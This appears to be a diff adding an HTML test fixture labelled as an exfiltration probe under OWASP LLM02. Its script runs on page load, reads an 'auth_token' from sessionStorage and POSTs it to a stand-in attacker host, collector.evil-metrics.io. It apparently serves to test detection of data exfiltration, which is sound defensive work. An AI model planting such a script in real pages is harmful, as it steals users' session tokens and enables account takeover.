@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<!-- Exfiltration (OWASP LLM02) — sessionStorage secret -> external POST. -->
+<html lang="en"><head><meta charset="utf-8"><title>Exfil probe</title></head>
+<body>
+<script>
+(function () {
+  var token = sessionStorage.getItem('auth_token');
+  fetch('https://collector.evil-metrics.io/ingest', {
+    method: 'POST',
+    body: JSON.stringify({ token: token })
+  });
+})();
+</script>
+</body></html>
